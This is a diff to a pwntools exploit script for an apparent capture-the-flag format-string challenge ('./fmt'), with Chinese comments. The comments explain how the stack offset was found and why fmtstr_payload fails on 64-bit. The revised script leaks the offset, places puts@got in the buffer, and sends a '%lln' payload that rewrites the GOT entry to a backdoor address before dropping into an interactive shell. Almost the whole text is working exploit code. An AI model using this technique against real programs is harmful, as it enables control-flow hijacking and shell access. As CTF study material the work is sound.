@@ -5,34 +5,34 @@ elf = ELF(r'./fmt')
 context.log_level = 'debug'
 context.arch = 'amd64'
 
-r.sendlineafter(b'name: ', b'test')
+# 这里的buf分两段read了，第一段是只能read 0x8个字节；第二段是进入magic函数的read
+# 所以利用%p泄漏的地址的时候不要忘记第一段read
 
-# payload = b'A' * 4 + b'%6$p'
-# r.sendlineafter(b'beleve you', payload)
+# r.sendafter(b'name: ', b'A' * 8)
+# r.sendlineafter(b'beleve you', b'%12$p')
 # r.recvline()
-# print(r.recvline())  # b'AAAA0x7024362541414141\n'
-# 经过调试在第六个位置输出了0x41414141，即AAAA的值，说明printf泄漏的地址会从第七个位置开始泄漏
-offset = 7
+# print(r.recvline())  # 0x4141414141414141\nGoodbye!
+# 经过调试在第12个位置输出了 0x4141414141414141，即A*8的值，说明buf的地址在第12个偏移的位置
+offset = 12
 
-# 尝试修改puts@got表为syetem@plt
+# 也可以用 gdb的fmtarg命令来自动计算偏移:
+# 在printf的位置下断点，然后: fmtarg [第一次read函数中rdi存储的内存地址]
+
 puts_got = elf.got['puts']
-backdoor_addr = 0x004011D6
-# 计算需要写入的值（分高低两部分，因为x64一次写入最多4字节）
-# shell_addr = 0x004011D6
-high = (backdoor_addr >> 16) & 0xffff  # 高16位: 0x0040
-low = backdoor_addr & 0xffff  # 低16位: 0x11D6
+backdoor_addr = 0x4011D6
+
+# 写入put@got内存地址到buf的第一段
+r.sendafter(b'name: ', p64(puts_got))
 
 # 64位的fmt下，使用fmtstr_payload()会出现截断问题导致失败
-# payload = fmtstr_payload(7, {puts_got: backdoor_addr})
+# payload = fmtstr_payload(12, {puts_got: backdoor_addr})
 
 print(f"puts_got: {hex(puts_got)}\nshell_addr: {hex(backdoor_addr)}")
 # puts_got: 0x00404018
 # shell_addr: 0x004011D6
-# 观察两者地址，只相差后两位4018、11d6，所以只修改\x18和\x40即可
-# 使用$hn来一次填充4个字节
-payload = f'%{high}c%10$hn%{str(low - high)}c%11$hn'
-payload = payload.ljust(24, 'A')  # 新偏移: 7 + 24/8 = 10
+
+# buf的第二段，利用fmt修改puts@got表为syetem@plt, 这里用 %lln 来一次性写入八字节
+payload = f'%{backdoor_addr}c%{offset}$lln'
 payload = payload.encode('utf-8')
-payload += p64(puts_got + 2) + p64(puts_got)
 r.sendlineafter(b'beleve you', payload)
 r.interactive()
